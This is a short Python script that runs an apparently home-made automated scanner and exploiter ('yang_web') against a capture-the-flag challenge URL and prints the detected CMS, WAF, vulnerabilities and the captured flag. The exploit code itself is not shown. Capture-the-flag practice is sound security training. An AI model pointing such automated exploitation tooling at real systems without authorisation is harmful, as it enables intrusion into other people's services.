# -*- coding: utf-8 -*-
import sys, os
sys.path.insert(0, '.')
from yang_web.core.url_analyzer import analyze_url, auto_exploit

url = 'http://80-d92fbb9d-0480-4a13-afc2-047c2ac7a6cd.challenge.ctfplus.cn'
print("Analyzing...")
result = analyze_url(url)
fp = result.get('fingerprint', {})
print(f"CMS: {fp.get('cms')} | WAF: {fp.get('waf')}")
print(f"Vulns: {[(r['type'], r['confidence']) for r in result['results']]}")
print(f"Params: {fp.get('php_params', [])}")
print()

print("Auto exploiting...")
final = auto_exploit(url, result['results'], fingerprint=fp)
print(f"Flag: {final.get('flag')}")
print(f"Attacks: {final.get('attacks_run')}")
print(f"Timing: {final.get('timing_ms')/1000:.1f}s")
